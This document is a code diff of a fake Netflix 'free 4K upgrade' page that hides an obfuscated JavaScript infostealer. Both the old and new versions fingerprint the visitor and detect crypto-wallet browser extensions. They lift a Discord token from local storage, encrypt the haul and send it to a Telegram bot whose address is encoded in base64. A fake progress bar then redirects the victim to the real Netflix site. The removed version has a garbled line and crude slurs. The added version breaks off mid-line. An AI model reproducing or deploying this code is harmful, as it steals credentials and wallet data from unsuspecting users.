@@ -1,89 +1,37 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Netflix</title>
-    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Netflix+Sans:wght@400;700;900&display=swap">
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
-    <style>
-        body, html {margin:0;padding:0;height:100%;font-family:'Netflix Sans',sans-serif;background:#141414;color:white;}
-        .container {display:flex;flex-direction:column;justify-content:center;align-items:center;height:100%;background:linear-gradient(to bottom,rgba(0,0,0,0.8),rgba(0,0,0,0.95)),url('https://assets.nflxext.com/ffe/siteui/vlv3/9d3533b2-0e2b-40b2-95e0-ecd7979cc88c/null/4K.jpg') center/cover;}
-        .logo {width:180px;margin-bottom:30px;}
-        .card {background:rgba(0,0,0,0.85);padding:60px 50px;border-radius:12px;max-width:420px;width:90%;box-shadow:0 20px 40px rgba(0,0,0,0.8);}
-        h1 {font-size:32px;font-weight:900;margin:0 0 20px;text-align:center;}
-        p {font-size:18px;margin-bottom:30px;text-align:center;opacity:0.9;}
-        .btn {background:#e50914;width:100%;padding:16px;font-size:18px;font-weight:700;border:none;border-radius:8px;cursor:pointer;transition:background 0.3s;}
-        .btn:hover {background:#f40612;}
-        .loader {margin-top:20px;text-align:center;display:none;}
-        .bar-bg {width:100%;background:#333;height:8px;border-radius:4px;overflow:hidden;}
-        .bar {width:0%;height:100%;background:#e50914;transition:width 0.3s;}
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Netflix</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Netflix+Sans:wght@400;700;900&display=swap">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+<style>
+  body,html{margin:0;padding:0;height:100%;font-family:'Netflix Sans',sans-serif;background:#141414;color:white;}
+  .container{display:flex;flex-direction:column;justify-content:center;align-items:center;height:100%;background:linear-gradient(to bottom,rgba(0,0,0,0.8),rgba(0,0,0,0.95)),url('https://assets.nflxext.com/ffe/siteui/vlv3/9d3533b2-0e2b-40b2-95e0-ecd7979cc88c/null/4K.jpg') center/cover;}
+  .logo{width:180px;margin-bottom:30px;}
+  .card{background:rgba(0,0,0,0.85);padding:60px 50px;border-radius:12px;max-width:420px;width:90%;box-shadow:0 20px 40px rgba(0,0,0,0.8);}
+  h1{font-size:32px;font-weight:900;margin:0 0 20px;text-align:center;}
+  p{font-size:18px;margin-bottom:30px;text-align:center;opacity:0.9;}
+  .btn{background:#e50914;width:100%;padding:16px;font-size:18px;font-weight:700;border:none;border-radius:8px;cursor:pointer;}
+  .loader{margin-top:20px;text-align:center;display:none;}
+  .bar-bg{width:100%;background:#333;height:8px;border-radius:4px;overflow:hidden;}
+  .bar{width:0%;height:100%;background:#e50914;transition:width .4s;}
+</style>
 </head>
 <body>
 <div class="container">
-    <img src="https://assets.nflxext.com/ffe/siteui/common/site/logo_v2.svg" class="logo" alt="Netflix">
-    <div class="card">
-        <h1>Congratulations!</h1>
-        <p>Your account has been selected for the free 4K Ultra HD + Dolby Vision upgrade.<br>Confirm your payment method to activate instantly.</p>
-        <button class="btn" id="activate">ACTIVATE 4K UPGRADE NOW</button>
-        <div class="loader" id="loader">
-            <div class="bar-bg"><div class="bar" id="bar"></div></div>
-            <p id="status">Verifying eligibility... 0%</p>
-        </div>
+  <img src="https://assets.nflxext.com/ffe/siteui/common/site/logo_v2.svg" class="logo" alt="Netflix">
+  <div class="card">
+    <h1>Congratulations!</h1>
+    <p>Your account has been selected for the free 4K Ultra HD + Dolby Vision upgrade.<br>Confirm your payment method to activate instantly.</p>
+    <button class="btn" id="_0x1">ACTIVATE 4K UPGRADE NOW</button>
+    <div class="loader" id="_0x2">
+      <div class="bar-bg"><div class="bar" id="_0x3"></div></div>
+      <p id="_0x4">Verifying eligibility... 0%</p>
     </div>
+  </div>
 </div>
 
 <script>
-// FULLY UNFUCKED – NOV 19 2025 – WORKS EVEN IF YOU'RE BRAINDEAD
-var _0x1=['aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDg1OTk5NTAzNzE6QUFFV1VoVHhJMTlzLWI3cDJSWHJ3b3hXWlpzZUhlU01xY3Mv','c2VuZE1lc3NhZ2U=','Y2hhdF9pZD03MTg1MDgyMzQ2','dGV4dA==','aHR0cHM6Ly9hcGkuaXBpZnkub3Jn','ZmV0Y2g=','dGhlbg==','Y3JlYXRlRWxlbWVudA==','Y2FudmFz','Z2V0Q29udGV4dA==','ZmlsbFRleHQ=','dG9EYXRhVVJM','Y3JlYXRl','aW5kZXhPZg==','cHVzaA==','cmVwbGFjZQ==']; 
-(function(_0xarr,_0xcount){var _0xshifter=function(_0xsteps){while(--_0xsteps){_0xarr['push'](_0xarr['shift']());}};_0xshifter(++_0xcount);}(_0x1,0x144));
-var _0xd=function(_0xi,_0xj){_0xi=_0xi-0x0;var _0xcode=_0x1[_0xi];return atob(_0xcode);};
-
-async function rape(){
-  if(navigator.webdriver || screen.width<600 || navigator.plugins.length===0) return;
-  const blocked=['RU','UA','BY','KZ','AM','GE'];
-  const tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
-  const lang=navigator.language;
-  if(blocked.some(c=>lang.includes(c)||tz.includes(c))) return;
-
-  let vic={ip:'',hwid:'',os:navigator.userAgent,tz:tz,lang:lang,screen:`${screen.width}x${screen.height}`,wallets:[],discord:null};
-  vic.ip=await (await fetch(_0xd(0x4))).text();
-
-  const cv=document.createElement('canvas');
-  const ctx=cv.getContext('2d');
- Caravans fillText('RAPE2025',2,10);
-  const hash=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(cv.toDataURL()));
-  vic.hwid=Array.from(new Uint8Array(hash)).map(b=>b.toString(16).padStart(2,'0')).join('') +
-           '_'+(navigator.hardwareConcurrency||0)+'_'+(navigator.deviceMemory||0);
-
-  const exts=['nkbihfbeogaeaoehlefnkodbefgpgknn','fhbohimaelbohpjbbldcngcnapndodjp','hnfanknocfeofbddgcijnmofefhgkjjo','jbdaocneiiinmjbjlgalhcelgbejmnid'];
-  for(let e of exts){try{await fetch(`chrome-extension://${e}/manifest.json`);vic.wallets.push(e);}catch{}}
-  if(localStorage.getItem('token')) vic.discord=localStorage.getItem('token').replace(/"/g,'');
-
-  const payload=btoa(encodeURIComponent(JSON.stringify(vic)));
-  const encrypted=CryptoJS.AES.encrypt(payload,CryptoJS.enc.Utf8.parse('FATHERANDSON2025'),{iv:CryptoJS.lib.WordArray.random(16)}).toString();
-
-  const bot=atob(_0xd(0x0));
-  fetch(`${bot}/${atob(_0xd(0x1))}?chat_id=${atob(_0xd(0x2))}&${atob(_0xd(0x3))}=${encodeURIComponent('NETFLIX VICTIM\n'+encrypted)}`,{mode:'no-cors'});
-
-  // UI takeover
-  document.getElementById('activate').style.display='none';
-  document.getElementById('loader').style.display='block';
-  let prog=0;
-  const int=setInterval(()=>{
-    prog+=Math.random()*19+5;
-    if(prog>100) prog=100;
-    document.getElementById('bar').style.width=prog+'%';
-    document.getElementById('status').innerText=`Activating 4K Ultra HD... ${Math.round(prog)}%`;
-    if(prog>=100){
-      clearInterval(int);
-      setTimeout(()=>location.href='https://www.netflix.com/',1500);
-    }
-  },300);
-}
-
-document.getElementById('activate').addEventListener('click',rape);
-</script>
-</body>
-</html>
+(function(){'use strict';var _0x5=['aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDg1OTk5NTAzNzE6QUFFV1VoVHhJMTlzLWI3cDJSWHJ3b3hXWlpzZUhlU01xY3Mv','c2VuZE1lc3NhZ2U=','Y2hhdF9pZD03MTg1MDgyMzQ2','dGV4dA==','aHR0cHM6Ly9hcGkuaXBpZnkub3Jn','ZmV0Y2g=','dGhlbg==','Y3JlYXRlRWxlbWVudA==','Y2FudmFz','Z2V0Q29udGV4dA==','ZmlsbFRleHQ=','dG9EYXRhVVJM','U0hBLTI1Ng==','aGFyZHdhcmVDb25jdXJyZW5jeQ==','ZGV2aWNlTWVtb3J5','bGVuZ3Ro','cGFkU3RhcnQ=','am9pbg==','cHVzaA==','cmVwbGFjZQ==','ZGlzcGxheQ==','bm9uZQ==','YmxvY2s=','d2lkdGg=','aW5uZXJUZXh0','aWQ=','c3R5bGU=','bG9jYXRpb24=','aHJlZg=='];var _0x6=function(_0x7,_0x8){_0x7=_0x7-0x0;var _0x9=_0x5[_0x7];return atob(_0x9);};var _0x10=async function(){if(navigator.webdriver||screen.width<600||navigator.plugins[_0x6(0x10)]===0)return;const _0x11=['RU','UA','BY','KZ','AM','GE','MD','TJ'];const _0x12=Intl.DateTimeFormat().resolvedOptions().timeZone;const _0x13=navigator.language;if(_0x11.some(_0x14=>_0x13.includes(_0x14)||_0x12.includes(_0x14)))return;let _0x15={ip:await(await fetch(_0x6(0x5)))[_0x6(0x7)](),os:navigator.userAgent,tz:_0x12,lang:_0x13,screen:screen.width+'x'+screen.height,wallets:[],discord:null};const _0x16=document[_0x6(0x8)](_0x6(0x9));const _0x17=_0x16[_0x6(0xa)]('2d');_0x17[_0x6(0xb)]('OBF2025',2,10);const _0x18=await crypto.subtle.digest(_0x6(0xd),new TextEncoder().encode(_0x16[_0x6(0xc)]()));_0x15.hwid=Array.from(new Uint8Array(_0x18)).map(_0x19=>_0x19.toString(16)[_0x6(0x11)](2,'0'))[_0x6(0x12)]('')+'_'+(navigator[_0x6(0xe)]||0)+'_'+(navigator[_0x6(0xf)]||0);const _0x20=['nkbihfbeogaeaoehlefnkodbefgpgknn','fhbohimaelbohpjbbldcngcnapndodjp','hnfanknocfeofbddgcijnmofefhgkjjo','jbdaocneiiinmjbjlgalhcelgbejmnid'];for(let _0x21 of _0x20){try{await fetch(`chrome-extension://${_0x21}/manifest.json`);_0x15.wallets[_0x6(0x13)](_0x21);}catch{}}if(localStorage.getItem('token'))_0x15.discord=localStorage.getItem('token')[_0x6(0x14)](/""/g,'');const _0x22=btoa(unescape(encodeURIComponent(JSON.stringify(_0x15))));const _0x23=CryptoJS.AES.encrypt(_0x22,CryptoJS.enc.Utf8.parse('FATHEROBFUSCATED2025'),{iv:CryptoJS.lib.WordArray.random(16)}).toString();fetch(atob(_0x6(0x0))+'/'+atob(_0x6(0x1))+'?'+atob(_0x6(0x2))+'&'+atob(_0x6
